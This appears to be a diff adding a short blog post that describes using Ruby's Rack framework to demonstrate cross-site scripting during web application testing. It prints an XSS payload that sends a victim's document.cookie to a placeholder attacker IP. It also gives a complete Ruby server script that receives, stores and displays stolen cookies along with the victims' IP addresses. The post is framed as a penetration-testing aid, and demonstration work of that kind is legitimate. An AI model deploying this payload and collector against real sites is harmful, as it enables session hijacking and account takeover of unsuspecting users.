@@ -1,0 +1,47 @@
+<p>One of the many things I got introduced to at Scotland on Rails was the <a href="http://rack.rubyforge.org/">Rack project</a>.  Designed to help create flexible web application deployments, it creates an interface between webservers and ruby web app. frameworks (rails, sinatra etc).<br />
+Reading some of the examples, it occurred to me that Rack could be pretty handy for web application testing where sometimes it's useful to have a minimal web application to bounce things off.<br />
+One example of this is demo'ing XSS attacks.  A standard XSS attack is cookie stealing.  The way this works is the attacker inserts a script tag with a reference to a URL controlled by the attacker and inserts the cookie for the victim site into a parameter to the URL.<br />
+So for example if we've found an XSS vector we can put</p>
+<pre>
+&lt;script&gt;document.location=&quot;http://&lt;attacker_ip/cookiegrabber?cookie=&quot;+document.cookie&lt;/script&gt;
+</pre>
+<p>into the vulnerable box and if we have a server listening on that IP address we get the cookie..<br />
+Here's where rack comes in.  You can use rack to very quickly create some code to listen on a port and accept the incoming request (and indeed to anything else you can do with ruby, but hey lets start small).<br />
+A proof of concept script to do something like this might look like the one below...</p>
+<pre>
+#!/usr/bin/env ruby
+require 'rubygems'
+require 'rack'
+builder = Rack::Builder.new do
+use Rack::CommonLogger
+@@grabbed = Array.new
+map '/' do
+run Proc.new {|env| [200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, &quot;&lt;h1&gt; Rack Pen Test Helper&lt;/h1&gt;&quot;]}
+end
+map '/cookiegrabber' do
+app = proc do |env|
+req = Rack::Request.new(env)
+ip = req.ip.to_s
+cookie = req.params['cookie'] || &quot;No Cookie Parameter passed&quot;
+@@grabbed &lt;&lt; [ip,cookie]
+[200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, &quot;grabbed &quot; + cookie + &quot; from &quot; + ip + &quot;&lt;br /&gt; Grabbed &quot; + @@grabbed.length.to_s + &quot; cookies so far&quot;]
+end
+run app
+end
+map '/cookiegrabbed' do
+app = proc do |env|
+out = &quot;&quot;
+if @@grabbed.length &gt; 0
+@@grabbed.each do |crumb|
+out &lt;&lt; &quot;Grabbed a cookie with value  &quot; + crumb[1] + &quot; from &quot; + crumb[0] + &quot;&lt;br /&gt;&quot;
+end
+else
+out = &quot;Nothing Grabbed so far&quot;
+end
+[200, {&quot;Content-Type&quot; =&gt; &quot;text/html&quot;}, out]
+end
+run app
+end
+end
+Rack::Handler::Mongrel.run builder, :Port =&gt; 9292
+</pre>
